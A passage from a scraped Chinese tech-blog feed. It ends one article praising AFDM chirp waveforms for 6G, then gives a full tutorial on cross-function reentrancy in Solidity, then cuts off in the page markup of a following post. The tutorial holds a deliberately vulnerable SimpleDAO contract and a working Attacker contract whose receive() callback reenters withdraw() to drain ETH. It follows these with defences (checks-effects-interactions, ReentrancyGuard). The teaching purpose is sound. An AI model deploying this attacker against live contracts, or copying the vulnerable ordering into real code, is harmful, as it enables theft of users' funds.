<p>面对 6G 的超高动态，物理层先锋们做了一个违背祖宗的决定：</p>
<p><strong>抛弃正弦波，改用 Chirp（线性调频信号）。</strong>
<img src="http://openwrite.cn/uploads/20293/59390/a1004659-fb9b-4dc7-99db-514fd3eed83a.png" alt="demo_afdm_basics.png" loading="lazy"/></p>
<p>想象一下：</p>
<ul>
<li><strong>OFDM 的子载波</strong> 像是一排排<strong>垂直竖立</strong>的栅栏。风（多普勒）一吹，栅栏就歪了，互相碰撞。</li>
<li><strong>AFDM 的子载波</strong> 像是<strong>倾斜的</strong>多米诺骨牌。
它的频率本身就是随时间线性变化的：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>e</mi><mrow><mi>j</mi><mn>2</mn><mi>p</mi><mi>i</mi><mo stretchy="false">(</mo><mi>f</mi><mi>t</mi><mo>+</mo><mi>f</mi><mi>r</mi><mi>a</mi><mi>c</mi><mi>c</mi><mn>2</mn><msup><mi>t</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">e^{j2pi (ft + frac{c}{2}t^2)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9869em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9869em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mord mtight">2</span><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">i</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">t</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">c</span><span class="mord mtight"><span class="mord mathnormal mtight">c</span></span><span class="mord mtight"><span class="mord mtight">2</span></span><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span></span>。</li>
</ul>
<p>这里的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span></span></span></span></span> (Chirp Rate)，就是我们手中的​<strong>魔法钥匙</strong>​。</p>
<hr/>
<h3 data-id="heading-3">04. DAFT：上帝的扭曲力场</h3>
<p>有了 Chirp 信号，我们如何调制数据？</p>
<p>欢迎来到数学的无人区—— ​<strong>DAFT (离散仿射傅里叶变换)</strong> ​。</p>
<p>别被名字吓到。它的物理本质极其性感：</p>
<p><strong>它在对时频平面（Time-Frequency Plane）进行“剪切” (Shearing) 和“旋转”。</strong></p>
<ul>
<li><strong>传统 FFT</strong> 是正正方方的网格。</li>
<li><strong>DAFT</strong> 通过调整参数 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span></span></span></span></span>，把网格<strong>扭曲</strong>成平行四边形，使其斜率与信道的<strong>多普勒频移斜率</strong>完美对齐。</li>
</ul>
<p><strong>见证奇迹的时刻：</strong></p>
<p>当信道的最大多普勒频移为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></msub></mrow><annotation encoding="application/x-tex">f_{max}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ma</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 时，我们只需要设置 Chirp 参数 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>=</mo><mn>2</mn><msub><mi>f</mi><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></msub><mi mathvariant="normal">/</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">c = 2f_{max}/T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">2</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ma</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></span>。</p>
<p>此时，原本在这个星球上狂暴变化的信道，在 DAFT 变换后的域里，竟然奇迹般地​<strong>变成了一条直线（时不变信道）</strong> ​！</p>
<blockquote>
<p><strong>我们没有消除多普勒，我们只是通过扭曲坐标系，把它“骗”过去了。</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-4">05. 降维打击：全分集 (Full Diversity) 的暴力美学</h3>
<p>AFDM 最让通信人上瘾的，是它的抗衰落能力。</p>
<p>在 OFDM 中，如果一个子载波掉进深衰落（Deep Fade）的坑里，上面的数据就死定了。</p>
<p>但在 AFDM 中，<strong>每一个数据符号都“弥散”在整个带宽和时隙上。</strong></p>
<p>这就好比：</p>
<ul>
<li><strong>OFDM</strong> 是把鸡蛋放在 1000 个篮子里。摔了一个篮子，就碎一个鸡蛋。</li>
<li><strong>AFDM</strong> 是把鸡蛋打散，均匀地涂在 1000 个篮子上。摔碎几个篮子？无所谓，把剩下的拼起来，鸡蛋还是完整的。</li>
</ul>
<p><strong>结论炸裂：</strong></p>
<p>多普勒越大，多径越复杂，AFDM 的性能反而越好（分集阶数越高）。</p>
<p><strong>这是物理层对恶劣环境的最强嘲讽。</strong></p>
<hr/>
<h3 data-id="heading-5">06. 终极杀手锏：它不再只是通信</h3>
<p>如果你以为 AFDM 只是为了让网速快一点，那你就把格局想小了。</p>
<p>AFDM 真正让 6G 颤抖的，是它的 <strong>“双重身份”</strong> 。</p>
<p>请回想一下，AFDM 的核心波形是什么？<strong>是 Chirp。</strong></p>
<p>在通信人眼里，这是新波形；但在<strong>雷达人</strong>眼里，这是 <strong>“老祖宗”</strong> ！</p>
<p><strong>一个惊人的宿命出现了：</strong></p>
<p>当我们在 6G 基站上发射 AFDM 波形时，我们实际上是在发射​<strong>雷达波</strong>​。</p>
<ul>
<li><strong>OFDM 是“盲人”：</strong> 它只能以此岸传到彼岸，不知道中间经历了什么。</li>
<li><strong>AFDM 是“睁眼玩家”：</strong> 它的波形天然具备​<strong>探测能力</strong>​。它在传输数据的同时，顺便把周围环境的 <strong>距离（Delay）</strong> 和 <strong>速度（Doppler）</strong> 扫描了一遍。</li>
</ul>
<p><strong>这就是 6G 的圣杯——通感一体化 (ISAC)。</strong></p>
<p>未来的基站，不需要你发导频告诉它你在哪。通过 AFDM 的回波，基站直接 <strong>“看”</strong> 到了你。</p>
<p>它知道这辆车在以 120km/h 变道，它知道那颗卫星在以 7.6km/s 靠近。</p>
<p>因为我看清了你，所以我能完美地调节坐标系来适应你。</p>
<p><strong>通信与感知，在 AFDM 的时延-多普勒域里，完成了物理层上的“灵肉合一”。</strong></p>
<hr/>
<h3 data-id="heading-6">结语</h3>
<p>OFDM 统治了二十年，它把“静态”做到了极致。</p>
<p><strong>但 AFDM 的出现，标志着我们终于有勇气去拥抱“动态”。</strong></p>
<p>在 7.6km/s 的星链上，在 1000km/h 的真空管道里，正弦波的时代正在落幕。</p>
<p>那个属于 Chirp，属于 DAFT，属于 <strong>“御风而行”</strong> 的时代，才刚刚开始。</p>
<hr/>
<blockquote>
<p>“欢迎关注公众号 <strong>3GPP仿真实验室</strong>！这里是通信算法工程师的加油站。</p>
<p>我们不搬运新闻，只输出<strong>可运行的代码</strong>和<strong>深度标准解读</strong>。</p>
<p>👇 <strong>新人见面礼（后台回复关键词获取）：</strong></p>
<p>回复【LDPC】：获取 5G NR LDPC 编解码 MATLAB 代码（含注释）。
回复【工具】：通信人减负神器：5G NR 帧结构与频点一键生成器（Python+Excel+Web三版）。
回复【Pytorch】：获取 5G NR OFDM 链路 Pytorch 教学代码（含注释），助力人工智能 + 通信</p>
<p>让我们一起探索 6G 的无限可能。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[10分钟智能合约：进阶实战-3.2.2 跨函数重入]]></title>    <link>https://juejin.cn/post/7605848213602467886</link>    <guid>https://juejin.cn/post/7605848213602467886</guid>    <pubDate>2026-02-12T14:08:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605848213602467886" data-draft-id="7605711582430134323" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="10分钟智能合约：进阶实战-3.2.2 跨函数重入"/> <meta itemprop="keywords" content="Solidity,web3,智能合约"/> <meta itemprop="datePublished" content="2026-02-12T14:08:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Rockbean"/> <meta itemprop="url" content="https://juejin.cn/user/4054654615823560"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            10分钟智能合约：进阶实战-3.2.2 跨函数重入
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4054654615823560/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Rockbean
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T14:08:11.000Z" title="Thu Feb 12 2026 14:08:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>欢迎订阅专栏</strong>：<a href="https://juejin.cn/column/7602463463105642542" title="https://juejin.cn/column/7602463463105642542" target="_blank">10分钟智能合约：进阶实战</a></p>
<h2 data-id="heading-0">跨函数重入：定义、原理与经典案例</h2>
<p><strong>跨函数重入</strong>是指攻击者通过一次外部调用，<strong>递归地重新进入同一个合约的另一个函数</strong>，利用多个函数间共享的状态尚未更新的窗口期，执行非预期的操作。<br/>
这一攻击类型的<strong>标志性事件</strong>是 2016 年的 <strong>The DAO 攻击</strong>，导致约 360 万 ETH 被分叉回滚，直接促成了以太坊经典（ETC）的诞生。</p>
<hr/>
<h3 data-id="heading-1">1. 核心原理</h3>
<p>跨函数重入的根本原因与单函数重入相同：<strong>状态更新滞后于外部调用</strong>。<br/>
区别在于，重入点不再是当前函数本身，而是<strong>另一个也依赖同一状态变量的函数</strong>。</p>
<p>典型脆弱模式：</p>
<ul>
<li>合约中有 <strong>两个或以上</strong> 的函数读取/修改同一个状态变量（如 <code>balances[user]</code>）。</li>
<li>其中一个函数在<strong>状态更新前</strong>发起外部调用。</li>
<li>攻击者在该外部调用的回调中，调用另一个函数，后者读取<strong>尚未更新</strong>的状态，执行操作（如再次提款）。</li>
</ul>
<hr/>
<h3 data-id="heading-2">2. 经典示例：The DAO 攻击简化复现</h3>
<p>以下代码<strong>高度简化</strong>了 DAO 的核心逻辑，仅用于演示跨函数重入原理，并非完整复现。</p>
<pre><code class="hljs language-solidity" lang="solidity">// 有漏洞的DAO简化版
contract SimpleDAO {
    mapping(address =&gt; uint) public balances;

    // 存款
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 1️⃣ 拆分提案并提取资金（漏洞函数）
    function splitDAO(address _recipient, uint _amount) public {
        uint userBalance = balances[msg.sender];
        require(userBalance &gt;= _amount, "Insufficient balance");

        // ⚠️ 漏洞：先进行外部调用，后更新状态
        // 假设这里调用了某种奖励分发合约，触发外部回调
        (bool success, ) = _recipient.call{value: _amount}("");
        require(success, "Transfer failed");

        // 状态更新滞后
        balances[msg.sender] -= _amount;
    }

    // 2️⃣ 另一个提款函数（被重入的目标）
    function withdraw(uint _amount) public {
        require(balances[msg.sender] &gt;= _amount, "Insufficient balance");
        balances[msg.sender] -= _amount;
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
    }
}
</code></pre>
<p><strong>攻击者合约</strong>：</p>
<pre><code class="hljs language-solidity" lang="solidity">contract Attacker {
    SimpleDAO public dao;

    constructor(address _dao) {
        dao = SimpleDAO(_dao);
    }

    // 攻击入口：先存款，再触发漏洞
    function attack() public payable {
        dao.deposit{value: 1 ether}();
        dao.splitDAO(address(this), 1 ether);  // 将收款地址设为自己
    }

    // 收到ETH时的回调
    receive() external payable {
        if (address(dao).balance &gt;= 1 ether) {
            dao.withdraw(1 ether);  // ⚠️ 跨函数重入：调用另一个函数 withdraw
        }
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-3">3. 攻击过程详解</h3>




























































<table><thead><tr><th>步骤</th><th>操作</th><th>状态变化 / 关键点</th></tr></thead><tbody><tr><td>1</td><td>攻击者 <code>attack()</code> 调用 <code>dao.deposit(1 ETH)</code></td><td><code>balances[attacker] = 1 ETH</code></td></tr><tr><td>2</td><td>调用 <code>dao.splitDAO(attacker, 1 ETH)</code></td><td>进入漏洞函数</td></tr><tr><td>3</td><td>检查 <code>balances[attacker] ≥ 1</code> → 通过</td><td>此时余额仍为 1</td></tr><tr><td>4</td><td>向攻击者发送 1 ETH</td><td>触发攻击者的 <code>receive()</code></td></tr><tr><td>5</td><td><strong>攻击者 <code>receive()</code> 内调用 <code>dao.withdraw(1 ETH)</code></strong></td><td><strong>跨函数重入开始</strong></td></tr><tr><td>6</td><td><code>withdraw</code> 检查 <code>balances[attacker] ≥ 1</code></td><td><strong>由于 splitDAO 尚未扣款，余额仍为 1 → 通过</strong></td></tr><tr><td>7</td><td><code>withdraw</code> 扣减余额 (1 → 0)，并向攻击者发送 1 ETH</td><td>攻击者再得 1 ETH</td></tr><tr><td>8</td><td><code>withdraw</code> 执行完毕，返回 <code>splitDAO</code></td><td>继续执行原 <code>splitDAO</code></td></tr><tr><td>9</td><td><code>splitDAO</code> 执行 <code>balances[attacker] -= 1</code></td><td>此时余额已是 0，再减 1 → 下溢？在 Solidity 0.8+ 会报错，早期版本会变成 2²⁵⁶-1</td></tr><tr><td>10</td><td>攻击者可重复循环（视回调控制）</td><td>直至合约 ETH 耗尽</td></tr></tbody></table>
<p><strong>攻击效果</strong>：攻击者从最初 1 ETH 余额，最终提取出远超其实际份额的资金。</p>
<hr/>
<h3 data-id="heading-4">4. 跨函数重入 vs 其他重入类型</h3>



































<table><thead><tr><th>类型</th><th>重入目标函数</th><th>典型特征</th><th>代表案例</th></tr></thead><tbody><tr><td><strong>单函数重入</strong></td><td><strong>同一个函数</strong></td><td>函数内部递归调用自身</td><td>经典提款漏洞</td></tr><tr><td><strong>跨函数重入</strong></td><td><strong>同一合约的不同函数</strong></td><td>两个函数共享同一状态变量</td><td>The DAO 攻击</td></tr><tr><td><strong>跨合约重入</strong></td><td><strong>另一个合约的函数</strong></td><td>合约 A 调用 B，B 回调 A 的函数</td><td>多次发生于跨协议交互</td></tr><tr><td><strong>只读重入</strong></td><td><strong><code>view</code> 函数</strong></td><td>不修改状态，但读取尚未更新的数据，用于操纵其他协议</td><td>Acala aUSD 攻击</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-5">5. 防御措施</h3>
<h4 data-id="heading-6">✅ <strong>核心防御：检查-生效-交互（Checks-Effects-Interactions）</strong></h4>
<p>任何可能被外部重入的函数，都必须在外部调用<strong>之前</strong>完成所有内部状态更新。</p>
<pre><code class="hljs language-solidity" lang="solidity">function splitDAO(address _recipient, uint _amount) public {
    uint userBalance = balances[msg.sender];
    require(userBalance &gt;= _amount, "Insufficient balance");

    // ✅ 先更新状态
    balances[msg.sender] -= _amount;

    // ✅ 再执行外部调用
    (bool success, ) = _recipient.call{value: _amount}("");
    require(success, "Transfer failed");
}
</code></pre>
<h4 data-id="heading-7">✅ <strong>重入锁</strong></h4>
<p>使用 <code>ReentrancyGuard</code> 修饰符，确保在函数执行期间整个合约不可重入。<strong>注意</strong>：重入锁是全局性的，可以同时防御单函数和跨函数重入。</p>
<pre><code class="hljs language-solidity" lang="solidity">import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SimpleDAO is ReentrancyGuard {
    function splitDAO(address _recipient, uint _amount) public nonReentrant {
        // 安全
    }
    function withdraw(uint _amount) public nonReentrant {
        // 安全
    }
}
</code></pre>
<h4 data-id="heading-8">✅ <strong>最小化外部调用</strong></h4>
<p>仅在绝对必要时发起外部调用，且尽可能在函数末尾进行。若必须与外部交互，优先使用**“拉取支付”（Pull Payment）**模式，将发送资产的责任转移给用户。</p>
<hr/>
<h3 data-id="heading-9">6. 现代启示与演变</h3>
<ul>
<li><strong>重入锁已成为标准</strong>：OpenZeppelin 的 <code>ReentrancyGuard</code> 被绝大多数 DeFi 项目采用，显著降低了跨函数重入的风险。</li>
<li><strong>只读重入的新挑战</strong>：即使不修改状态，重入期间读取<strong>不一致的瞬时状态</strong>仍可能被用于操纵预言机、价格计算等，需要结合其他约束防御。</li>
<li><strong>跨合约重入仍需警惕</strong>：当多个合约协同工作时，单一合约的重入锁无法阻止另一合约的回调，需要协议级别的协调设计。</li>
</ul>
<hr/>
<h3 data-id="heading-10">总结</h3>
<p><strong>跨函数重入是重入攻击家族中极具破坏力的成员</strong>，其本质依然是<strong>状态更新滞后于外部调用</strong>，只是重入点被导向了另一个共享状态的函数。<br/>
防御跨函数重入并不需要特殊技巧——<strong>遵循 CEI 模式并配合重入锁</strong>即可一劳永逸地解决问题。然而，理解其与单函数重入的区别，有助于在审计中更敏锐地识别那些**“看似无关，实则共享状态”**的函数组合。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[10分钟智能合约：进阶实战-3.2.3 跨合约重入]]></title>    <link>https://juejin.cn/post/7605848213602500654</link>    <guid>https://juejin.cn/post/7605848213602500654</guid>    <pubDate>2026-02-12T14:09:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605848213602500654" data-draft-id="7605848213602271278" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="10分钟智能合约：进阶实战-3.2.3 跨合约重入"/> <meta itemprop="keywords" content="Solidity,web3,智能合约"/> <meta itemprop="datePublished" content="2026-02-12T14:09:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Rockbean"/> <meta itemprop="url" content="https://juejin.cn/user/4054654615823560"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            10分钟智能合约：进阶实战-3.2.3 跨合约重入
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4054654615823560/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Rockbean
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T14:09:05.000Z" title="Thu Feb 12 2026 14:09:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body 